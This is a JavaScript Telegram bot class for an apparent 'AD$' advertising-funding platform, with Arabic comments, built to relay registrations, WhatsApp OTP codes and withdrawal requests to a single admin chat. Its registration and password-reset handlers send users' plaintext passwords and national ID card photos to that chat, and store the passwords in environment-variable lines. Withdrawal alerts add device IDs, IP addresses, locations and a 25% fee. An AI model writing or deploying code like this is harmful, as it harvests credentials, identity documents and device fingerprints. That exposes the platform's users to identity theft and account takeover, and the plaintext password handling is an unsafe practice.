// telegramBot.js - دعم تعدد الحسابات، إرسال صورة البطاقة الشخصية، وكود واتساب 7 أرقام

class TelegramBotManager {
    constructor(token, adminChatId, onDecisionCallback) {
        this.token = token;
        this.adminChatId = String(adminChatId);
        this.onDecisionCallback = onDecisionCallback;
        this.apiUrl = `https://api.telegram.org/bot${this.token}`;
        this.lastUpdateId = 0;
        this.isPolling = false;
    }

    startListening() {
        if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
        this.isPolling = true;
        console.log("✅ بوت التيليجرام متصل (نظام الحسابات المتعددة + KYC + OTP)...");
        this.registerBotCommands();
        this.pollUpdates();
    }

    async registerBotCommands() {
        try {
            await fetch(`${this.apiUrl}/setMyCommands`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    commands: [
                        { command: "menu", description: "📊 عرض لوحة التحكم والحسابات" },
                        { command: "clear", description: "🗑️ مسح قوائم السحوبات بالكامل" }
                    ]
                })
            });
        } catch (e) {}
    }

    async pollUpdates() {
        while (this.isPolling) {
            try {
                const res = await fetch(`${this.apiUrl}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=25`);
                const data = await res.json();

                if (data.ok && Array.isArray(data.result)) {
                    for (const update of data.result) {
                        this.lastUpdateId = update.update_id;

                        if (update.callback_query) {
                            await this.handleButtonClick(update.callback_query);
                        }

                        if (update.message && update.message.text) {
                            await this.handleTextCommand(update.message);
                        }
                    }
                }
            } catch (err) {
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }

    async handleTextCommand(message) {
        const chatId = String(message.chat.id);
        if (chatId !== this.adminChatId) return;

        const text = message.text.trim();

        if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.sendPlainMessage("✅ *تم مسح قوائم السحوبات وتصفير المبالغ المعلقة لجميع الحسابات!*");
            return;
        }

        if (text === "/start" || text === "/menu" || text === "تحكم") {
            const status = await this.onDecisionCallback("ALL", "get_status");
            const panelText =
`🎛 *لوحة التحكم - نظام الحسابات المتعددة*
━━━━━━━━━━━━━━━━━━━━
👥 *عدد الحسابات المسجلة:* \`${status?.usersCount || 0}\` مشترك
🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
📋 *إجمالي عمليات السحب:* \`${status?.historyCount || 0}\` عملية
━━━━━━━━━━━━━━━━━━━━
👇 *اختر الإجراء المطلوب:*`;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: panelText,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🗑️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }]
                        ]
                    }
                })
            });
        }
    }

    async sendPlainMessage(text, replyMarkup = null) {
        try {
            const body = {
                chat_id: this.adminChatId,
                text: text,
                parse_mode: "Markdown"
            };
            if (replyMarkup) body.reply_markup = replyMarkup;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
        } catch (e) {}
    }

    // 1. إرسال إشعار كود التحقق (7 أرقام) مع زر إرسال فوري لواتساب المشترك
    async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
        const intlPhone = "2" + phone; // تحويل 01xxxxxxxxx إلى 201xxxxxxxxx
        const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
        const waMessage = encodeURIComponent(
            `مرحباً بك في منصة AD$ للتمويل الإعلاني 🌐\nكود التحقق الخاص بك (${purposeText}) المكون من 7 أرقام هو:\n*${otpCode}*`
        );
        const waUrl = `https://wa.me/${intlPhone}?text=${waMessage}`;

        const msg =
`🔐 *كود مصادقة واتساب (7 أرقام - OTP)*
━━━━━━━━━━━━━━━━━━━━
📌 *السبب:* ${purposeText}
📱 *رقم الهاتف:* \`${phone}\`
🔢 *كود الـ 7 أرقام:* \`${otpCode}\`
📡 *حالة الإرسال التلقائي:* ${autoSent ? "✅ تم الإرسال تلقائياً عبر WhatsApp API" : "⚡ جاهز للإرسال المباشر عبر الزر أدناه"}
━━━━━━━━━━━━━━━━━━━━`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "📲 إرسال الكود لواتساب المشترك بضغطة واحدة", url: waUrl }]
            ]
        };

        await this.sendPlainMessage(msg, keyboard);
    }

    // 2. إرسال بيانات المشترك الجديد + صورة البطاقة الشخصية + سطر Environment Variables
    async sendNewRegistrationWithIdCard(regData) {
        const { fullName, phone, password, idCardBase64, deviceInfo, date } = regData;
        const envKey = `USER_${phone}`;
        const envValue = `${fullName}|${password}|ضع_رابط_VIABTC_الخاص_به_هنا`;

        const caption =
`🆕 *طلب تسجيل مشترك جديد + صورة البطاقة*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم الكامل:* ${fullName}
📱 *رقم الهاتف:* \`${phone}\`
🔑 *كلمة المرور المختارة:* \`${password}\`
📲 *نوع الجهاز:* ${deviceInfo?.deviceModel || "غير معروف"}
🌐 *الـ IP الخارجي:* \`${deviceInfo?.ip || "غير معروف"}\`
⏰ *التوقيت:* ${date}
━━━━━━━━━━━━━━━━━━━━
⚙️ *لتسجيله في Render Environment Variables:*
📌 *الاسم (Key):*
\`${envKey}\`
📌 *القيمة (Value):*
\`${envValue}\``;

        try {
            if (idCardBase64 && idCardBase64.includes("base64,")) {
                const base64Data = idCardBase64.split("base64,")[1];
                const buffer = Buffer.from(base64Data, "base64");
                const formData = new FormData();
                formData.append("chat_id", this.adminChatId);
                formData.append("caption", caption);
                formData.append("parse_mode", "Markdown");
                formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), `id_${phone}.jpg`);

                await fetch(`${this.apiUrl}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } else {
                await this.sendPlainMessage(caption);
            }
        } catch (err) {
            console.error("خطأ في إرسال صورة البطاقة:", err.message);
            await this.sendPlainMessage(caption);
        }
    }

    // 3. إشعار تغيير كلمة المرور لتحديثها في Environment Variables عند الرغبة
    async sendPasswordResetNotice(user) {
        const envKey = `USER_${user.phone}`;
        const envValue = `${user.name}|${user.password}|${user.viabtcUrl || "رابط_فيا"}`;
        const text =
`🔄 *قام مشترك بتغيير كلمة المرور عبر OTP*
━━━━━━━━━━━━━━━━━━━━
👤 *المشترك:* ${user.name} (\`${user.phone}\`)
🔑 *كلمة المرور الجديدة:* \`${user.password}\`
━━━━━━━━━━━━━━━━━━━━
📋 *السطر المحدث لـ Environment Variables:*
\`${envKey}=${envValue}\``;

        await this.sendPlainMessage(text);
    }

    // 4. إرسال إشعار طلب السحب مع تحديد حساب المشترك
    async sendWithdrawNotification(record, totalPending) {
        if (!this.token || this.token.includes("ضع_توكن")) return;

        const rawDestination = String(record.destination || "").trim();
        const cleanCopyableNumber = rawDestination.replace(/\s+/g, "");
        const dev = record.deviceInfo || {};

        const text = 
`🔔 *طلب سحب جديد | حساب: ${record.accountOwnerName}*
━━━━━━━━━━━━━━━━━━━━
🆔 *رقم العملية:* \`${record.id}\`
📱 *حساب المشترك:* \`${record.userPhone}\` (${record.accountOwnerName})
👤 *اسم المستفيد:* ${record.userName}
💰 *المبلغ المخصوم:* $${record.gross}
📉 *رسوم التحويل (25%):* -$${record.fee}
💵 *الصافي بالدولار:* $${record.net}
🏦 *سعر الصرف الرسمي:* ${record.exchangeRate} ج.م
🇪🇬 *المبلغ المطلوب تحويله بالمصري:* *${Number(record.netEgp).toLocaleString("en-US", { minimumFractionDigits: 2 })} ج.م*
━━━━━━━━━━━━━━━━━━━━
💳 *وسيلة الدفع:* ${record.method}
📋 *اضغط على الرقم لنسخه فوراً:*
\`${cleanCopyableNumber}\`
${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:* \`${rawDestination}\`\n` : ""}━━━━━━━━━━━━━━━━━━━━
📱 *بيانات الجهاز والشبكة:*
🔖 *معرف الجهاز:* \`${dev.deviceId || "غير متاح"}\`
📲 *الجهاز:* ${dev.deviceModel || "غير معروف"}
⚙️ *المعالج:* ${dev.cpu || "غير معروف"} | 🧠 *الرام:* ${dev.ram || "غير معروف"}
🔋 *البطارية:* ${dev.battery || "غير متاح"}
🌐 *الـ IP:* \`${dev.ip || "غير معروف"}\` (${dev.isp || ""})
📍 *الموقع:* ${dev.location || "غير معروف"}
━━━━━━━━━━━━━━━━━━━━
📊 *المعلق في حساب المشترك:* $${totalPending.toFixed(2)}
⏰ *التوقيت:* ${record.date}`;

        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${record.userPhone}:${record.id}` }
                ],
                [
                    { text: "❌ فشلت العملية (إعادة المبلغ للمشترك)", callback_data: `reject:${record.userPhone}:${record.id}` }
                ],
                [
                    { text: "🗑️ مسح سجل هذا المشترك", callback_data: `clear_user:${record.userPhone}:${record.id}` }
                ]
            ]
        };

        try {
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: text,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });
        } catch (err) {
            console.error("فشل إرسال رسالة تيليجرام:", err.message);
        }
    }

    async handleButtonClick(callbackQuery) {
        const chatId = String(callbackQuery.message?.chat?.id || "");
        if (chatId !== this.adminChatId) return;

        const data = callbackQuery.data || "";
        const parts = data.split(":");
        const action = parts[0];
        const userPhone = parts[1];
        const txId = parts[2];
        const message = callbackQuery.message;

        if (action === "clear_all") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.answerCallback(callbackQuery.id, "✅ تم مسح جميع قوائم السحوبات بنجاح!");
            return;
        }

        if (action === "clear_user") {
            await this.onDecisionCallback(userPhone, "clear_user");
            await this.answerCallback(callbackQuery.id, `✅ تم مسح قائمة سحوبات المشترك ${userPhone}`);
            return;
        }

        const updatedRecord = await this.onDecisionCallback(userPhone, action, txId);

        if (!updatedRecord) {
            await this.answerCallback(callbackQuery.id, "⚠️ هذه العملية غير موجودة أو تم مسحها.");
            return;
        }

        const statusLine = action === "approve"
            ? "✅ *الحالة النهائية: تمت التسوية والدفع بنجاح*"
            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ لحساب المشترك)*";

        const updatedText = `${message.text}\n\n${statusLine}`;

        await fetch(`${this.apiUrl}/editMessageText`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: message.chat.id,
                message_id: message.message_id,
                text: updatedText,
                parse_mode: "Markdown"
            })
        });

        await this.answerCallback(
            callbackQuery.id,
            action === "approve" ? "تم اعتماد الدفع!" : "تم إلغاء العملية وإرجاع المبلغ!"
        );
    }

    async answerCallback(callbackQueryId, text) {
        await fetch(`${this.apiUrl}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text,
                show_alert: true
            })
        });
    }
}

module.exports = TelegramBotManager;
